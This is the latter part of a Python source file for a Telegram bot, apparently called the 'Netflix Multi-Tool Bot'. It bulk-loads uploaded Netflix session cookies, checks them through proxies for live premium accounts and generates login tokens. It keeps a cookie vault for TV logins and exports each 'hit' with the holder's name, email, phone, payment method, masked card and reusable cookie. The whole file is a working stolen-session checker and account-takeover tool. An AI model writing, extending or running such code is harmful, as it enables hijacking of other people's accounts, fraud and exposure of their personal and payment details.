    status_msg = await update.message.reply_text("📥 Downloading...")
    try:
        file = await context.bot.get_file(doc.file_id)
        zip_bytes = await file.download_as_bytearray()
        await status_msg.edit_text("📂 Extracting cookies...")
        
        os.makedirs(COOKIES_DIR, exist_ok=True)
        added, skipped = 0, 0
        
        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
                    continue
                if not name.lower().endswith(('.txt', '.json')):
                    skipped += 1
                    continue
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cookies = extract_cookie_dict_tv(content)
                    if not cookies or not cookies.get('NetflixId'):
                        skipped += 1
                        continue
                    base = os.path.basename(name)
                    safe = re.sub(r'[<>:"/\\|?*]', '_', base)
                    dest = os.path.join(COOKIES_DIR, safe)
                    if os.path.exists(dest):
                        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                        n, e = os.path.splitext(safe)
                        dest = os.path.join(COOKIES_DIR, f"{n}_{suf}{e}")
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(content)
                    added += 1
                except:
                    skipped += 1
        
        await status_msg.edit_text(f"✅ <b>Upload complete!</b>\n\n📥 Added: <b>{added}</b> cookies\n⏭️ Skipped: <b>{skipped}</b>\n🍪 Total in vault: <b>{count_vault_cookies()}</b>", parse_mode='HTML')
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only!")
        return
    with tv_stats_lock:
        msg = (f"📊 <b>TV Login Stats (All Time)</b>\n\n🍪 Vault: <b>{count_vault_cookies()}</b>\n🎬 Total attempts: <b>{tv_stats['total_logins']}</b>\n✅ Successful: <b>{tv_stats['successful']}</b>\n❌ Failed: <b>{tv_stats['failed']}</b>\n🚫 Invalid codes: <b>{tv_stats['codes_rejected']}</b>")
    await update.message.reply_text(msg, parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        if user_id not in user_state:
            user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        if user_state[user_id].get('busy'):
            await update.message.reply_html("⚠️ Already processing. Stop first.", reply_markup=STOP_MARKUP)
            return
        
        mode = user_state[user_id].get('mode', 'check')
        file = await update.message.document.get_file()
        ext = update.message.document.file_name.lower()
        
        with tempfile.TemporaryDirectory() as td:
            tp = os.path.join(td, update.message.document.file_name)
            await file.download_to_drive(tp)
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            if mode == "clean":
                await clean_cookies_process(update.effective_chat.id, content, user_id, context, update.message.document.file_name)
                return
            
            cookies = []
            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(tp)
            else:
                c = parse_cookie_file(content)
                for idx, (bn, cc) in enumerate(c):
                    if cc.get('NetflixId'):  
                        cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))
            
            seen = set()
            dedup = []
            for nm, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((nm, ck))
            
            if not dedup:
                await update.message.reply_text("❌ No valid Netflix cookies found in file!")
                return
            
            user_state[user_id]['cookies'] = dedup
            mode_text = {"check": "Account Check", "nftoken": "NFToken Generation"}.get(mode, mode)
            await update.message.reply_html(f"✅ Loaded <b>{len(dedup)}</b> unique cookies!\nMode: <b>{mode_text}</b>\n\nPress below to start.", reply_markup=CHECK_MARKUP)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies', [])
        if not cookies:
            await query.answer("No cookies! Upload first.")
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already running!")
            return
        
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        mode = user_state[user_id].get('mode', 'check')
        
        user_tasks[user_id] = context.application.create_task(
            process_cookies(chat_id, cookies, user_id, context, mode))
        await query.answer(f"Started checking {len(cookies)} cookies!")

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = True
        await query.answer("Stopped!")

async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits') or user_state.get(user_id, {}).get('live_hits', OrderedDict())
    if not hits:
        await query.answer("No hits yet!")
        return
    mode = user_state.get(user_id, {}).get('mode', 'check')
    all_c = []
    for idx, (nm, dd) in enumerate(hits.items(), 1):
        if mode == 'nftoken':
            ti = dd.get('token_info', {})
            all_c.append(f"TOKEN #{idx}\nToken: {ti.get('token','')}\nExpires: {ti.get('expires','')}")
        else:
            all_c.append(build_export_str(dd, idx))
    buf = io.BytesIO(("\n\n".join(all_c)).encode("utf-8"))
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename=f"Current_Hits_{len(hits)}.txt"), caption=f"📋 {len(hits)} hits found so far")
    await query.answer(f"Sent!")

async def clean_cookies_process(chat_id, content, user_id, context, filename):
    progress_msg = await context.bot.send_message(chat_id, "<b>🧹 Cleaning Cookies</b>\n<code>○○○○○</code>  Analyzing...", parse_mode='HTML')
    try:
        parsed = parse_cookie_file(content)
        if not parsed:
            await progress_msg.edit_text("<b>🧹 Cleaning Cookies</b>\n<code>○○○○○</code>  ❌ No Netflix cookies found!", parse_mode='HTML')
            return
        
        seen = set()
        unique = []
        for name, cd in parsed:
            h = hashlib.sha256(json.dumps(cd, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h)
                unique.append((name, cd))
        
        zip_buffer = io.BytesIO()
        valid = 0
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, (_, cd) in enumerate(unique, 1):
                if cd.get('NetflixId'):
                    valid += 1
                    expiry = int(time.time()) + 180 * 24 * 3600
                    lines = ["# Netscape HTTP Cookie File"]
                    for n, v in cd.items():
                        secure = "TRUE" if n == "SecureNetflixId" else "FALSE"
                        lines.append(f".netflix.com\tTRUE\t/\t{secure}\t{expiry}\t{n}\t{v}")
                    zf.writestr(f"Netflix_Cookie_{idx}.txt", "\n".join(lines))
        
        if valid > 0:
            zip_buffer.seek(0)
            await context.bot.send_document(chat_id, document=InputFile(zip_buffer, filename=f"Cleaned_{safe_filename(filename or 'cookies')}.zip"), caption=f"✅ <b>Cleaned!</b>\nValid: {valid}\n{WATERMARK}", parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id, "❌ No valid Netflix cookies after cleaning!", parse_mode='HTML')
        await progress_msg.delete()
    except Exception as e:
        await progress_msg.edit_text(f"<b>🧹 Error:</b> {str(e)}", parse_mode='HTML')

async def process_cookies(chat_id, cookies, user_id, context, mode):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    mode_text = {"check": "🔍 Account Check", "nftoken": "🔑 NF Token Generation"}.get(mode, mode)
    
    progress_msg = await context.bot.send_message(chat_id, f"<b>{mode_text}</b>\n<code>{'○'*dot_length}</code>  0/{total}", parse_mode='HTML', reply_markup=STOP_MARKUP)
    preview_msg = await context.bot.send_message(chat_id, "<b>📋 Preview will appear here...</b>", parse_mode='HTML')
    
    if user_id not in user_executors:
        user_executors[user_id] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    executor = user_executors[user_id]
    
    live_hits = OrderedDict()
    user_state[user_id]['live_hits'] = live_hits
    user_state[user_id]['hits_tmp'] = tempfile.mktemp(prefix="nf_")
    
    try:
        with open(user_state[user_id]['hits_tmp'], "w", encoding='utf-8') as ftmp:
            for batch_start in range(0, total, BATCH_SIZE):
                batch = cookies[batch_start:batch_start + BATCH_SIZE]
                if user_state.get(user_id, {}).get('stop'):
                    break

                loop = asyncio.get_running_loop()
                futures = [asyncio.wait_for(loop.run_in_executor(executor, generate_nftoken if mode == 'nftoken' else check_netflix_cookie, ck), timeout=35) for nm, ck in batch]
                
                try:
                    results = await asyncio.gather(*futures, return_exceptions=True)
                except asyncio.CancelledError:
                    break
                
                if user_state.get(user_id, {}).get('stop'):
                    break
                
                for i, result in enumerate(results):
                    checked += 1
                    if isinstance(result, Exception):
                        fails += 1
                        continue
                    
                    if mode == 'nftoken':
                        td, err = result
                        if td:
                            hits += 1
                            live_hits[f"Token_{hits}"] = {'token_info': td}
                            ftmp.write(json.dumps({'token': td['token'], 'expires': td['expires']}) + "\n")
                            ftmp.flush()
                        else:
                            fails += 1
                    else:
                        if result.get("ok"):
                            if result.get("premium"):
                                hits += 1
                                live_hits[f"Hit_{hits}"] = result
                                ftmp.write(json.dumps(result, default=str) + "\n")
                                ftmp.flush()
                            else:
                                free += 1
                        else:
                            fails += 1

                dd = min(dot_length, checked * dot_length // total) if total > 0 else dot_length
                db = '●' * dd + '○' * (dot_length - dd)
                nt = f"<b>{mode_text}</b>\n<code>{db}</code>  {checked}/{total}\nHits: <b>{hits}</b> | Fails: <b>{fails}</b>"
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=nt, parse_mode='HTML', reply_markup=STOP_MARKUP)
                except:
                    pass
    except:
        pass
    finally:
        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
        await context.bot.send_message(chat_id, "✅ Processing complete!")
    
    if hits:
        user_state[user_id]['final_hits'] = OrderedDict(live_hits)
        await context.bot.send_message(chat_id, "✅ <b>Done! Select result format:</b>", parse_mode='HTML', reply_markup=RESULT_MARKUP)

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    mode = user_state.get(user_id, {}).get('mode', 'check')
    if not hits:
        await query.answer("No results available!")
        return
    
    all_c = []
    for idx, (nm, dd) in enumerate(hits.items(), 1):
        all_c.append(build_export_str(dd, idx))
    buf = io.BytesIO(("\n\n".join(all_c)).encode("utf-8"))
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="Results.txt"), caption=f"📄 Results\n{WATERMARK}")
    await query.answer("Sent!")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('final_hits', OrderedDict())
    if not hits:
        await query.answer("No results available!")
        return
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, (nm, dd) in enumerate(hits.items(), 1):
            zf.writestr(f"result_{idx}.txt", build_export_str(dd, idx))
    buf.seek(0)
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="Results.zip"), caption=f"📦 Results .zip\n{WATERMARK}")
    await query.answer("Sent!")

def build_export_str(dd, idx):
    d = [f"========== HIT #{idx} =========="]
    for key, label in [('name','Name'),('email','Email'),('country','Country'),
                        ('plan','Plan'),('plan_price','Plan Price'),('member_since','Member Since'),
                        ('next_billing','Next Billing'),('payment_method','Payment'),('masked_card','Card'),
                        ('phone','Phone'),('video_quality','Quality'),('max_streams','Streams')]:
        d.append(f"{label}: {safe_html(dd.get(key,'Unknown'))}")
    cd = dd.get('cookie', {})
    ns = dict_to_netscape(cd) if isinstance(cd, dict) else str(cd)
    return "\n".join(d) + "\n\nNetscape Cookie ↓\n" + ns + f"\n\n{WATERMARK}"

# ----------------- मुख्य कार्यान्वयन (Main) -----------------
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    print("=" * 50)
    print("  Netflix Multi-Tool Bot (Unified)")
    print("=" * 50)
    print(f"  Vault cookies: {count_vault_cookies()}")
    print(f"  Proxies: {len(proxies_list)}")
    print(f"  {WATERMARK}")
    print("=" * 50)
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("stats", stats_command))

    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(check|nftoken|clean|tvlogin)$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern="^get_hits$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    
    # टेलिग्राम बॉट बॅकग्राउंडमध्ये चालू करणे
    def run_bot():
        time.sleep(2)
        app.run_polling(allowed_updates=Update.ALL_TYPES)

    t_bot = threading.Thread(target=run_bot)
    t_bot.start()

    # 24x7 पिंगर चालू करणे
    t_pinger = threading.Thread(target=run_always_on_pinger)
    t_pinger.start()

    # मुख्य HTTP Server (Render साठी)
    run_http_server()
